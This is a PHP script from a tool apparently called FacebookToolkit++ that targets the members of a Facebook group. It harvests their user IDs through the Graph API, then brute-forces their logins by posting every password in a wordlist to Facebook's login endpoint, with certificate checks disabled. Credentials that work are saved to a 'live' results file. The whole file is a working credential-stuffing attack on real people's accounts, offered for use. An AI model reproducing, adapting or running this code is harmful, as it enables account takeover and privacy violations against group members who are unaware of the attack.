<?php

/**
 * @category  Social_Engineering
 * @package   FacebookToolkit++
 * @author    Wahyu Arif Purnomo <hi@warifp.co>
 * @copyright 2019 WARIFP
 * @license   MIT License <https://opensource.org/licenses/MIT>
 * @version   1.7
 * @link      https://github.com/warifp/FacebookToolkit
 * @since     15 June 2019
 */

require_once "vendor/autoload.php";

use PHPHtmlParser\Dom;

$input = $climate->br()->input('Wordlist?');
$list_password = $input->prompt();

$input = $climate->br()->input('Username or ID Group?');
$id = $input->prompt();

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url_based . "/v3.3/" . $id . "/?access_token=" . $token);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$wahyuarifpurnomo = curl_exec($curl);
curl_close($curl);

$decode = json_decode($wahyuarifpurnomo);

$name_group = $decode->name;

$climate->br()->info('Group name is ' . $name_group);
sleep(3);

$save_dir_name = "tmp/id_" . $name_group . ".log";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url_based . "/v3.3/" . $id . "/members/?access_token=" . $token . '&limit=999999999999');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$wahyuarifpurnomo = curl_exec($curl);
curl_close($curl);

$decode = json_decode($wahyuarifpurnomo);

$climate->br()->info('Starting retrieve ID Member Group..');
echo "\n";
progress($progress);

$no = 0;
foreach ($decode->data as $hasil) {
    $no++;
    $colorstring = getName($n);
    if (!empty($hasil->id)) {
        echo $no . "." . $colors->getColoredString(" $hasil->name | $hasil->id", $warifp[$colorstring]) . "\n";

        $save_name = fopen($save_dir_name, 'a');
        fwrite($save, $hasil->id . "\n");
        fclose($save_name);
    }
}

$list_id = "tmp/id_" . $name_group . ".log" or die("File ID not found!");
$climate->br()->info('Retrieve ID success');
sleep(3);
$climate->br()->info('Starting brute force your friends by ID Member Group..');
echo "\n";
progress($progress);

// 

$no = 0;
function brute($username, $password, $no, $url_brute)
{

    $dom = new Dom;

    $save_dir_live = "result/bruteforce_membergroup-live.txt";
    $save_dir_die = "result/bruteforce_membergroup-die.txt";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_brute . "/login.php?login_attempt=1");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$username}&pass={$password}");
    curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
    $login = curl_exec($ch);

    $dom->loadStr($login, []);
    $contents = $dom->find('title');

    if ($contents == "<title>Masuk Facebook | Facebook</title>") {
        echo $no . ". \e[0;31mDIE\e[0m  | $username | $password\n";
        $save = fopen($save_dir_die, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    } else if ($contents == "<title>Coba lagi nanti</title>") {
        echo $no . ". \e[0;31mDIE\e[0m  | $username | $password\n";
        $save = fopen($save_dir_die, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    } else {
        echo $no . ". \e[0;33mLIVE\e[0m | $username | $password\n";
        $save = fopen($save_dir_live, 'a');
        fwrite($save, $username . "|" . $password . "\n");
        fclose($save);
    }
}

$file = file_get_contents("$list_id");
$username = explode("\n", str_replace("\r", "", $file));

$file = file_get_contents("$list_password");
$password = explode("\n", str_replace("\r", "", $file));

foreach ($username as $users) {
    $users = @trim($users);
    foreach ($password as $pass) {
        $no++;
        $pass = @trim($pass);
        echo brute($users, $pass, $no, $url_brute);
    }
}
// 

$save_dir_live = "result/bruteforce_membergroup-live.txt";
$save_dir_die = "result/bruteforce_membergroup-die.txt";

$climate->br()->shout('Done, your result saved in folder "' . $save_dir_live . '" and "' . $save_dir_die . '".');
$climate->br()->info('Cleaning log..');
echo "\n";
progress($progress);
$delete = "tmp/id.log";
unlink($delete) or die("\e[1;31mCouldn't delete file, file not found\e[0m");
sleep(3);
$climate->br()->info('Done cleaning log.');
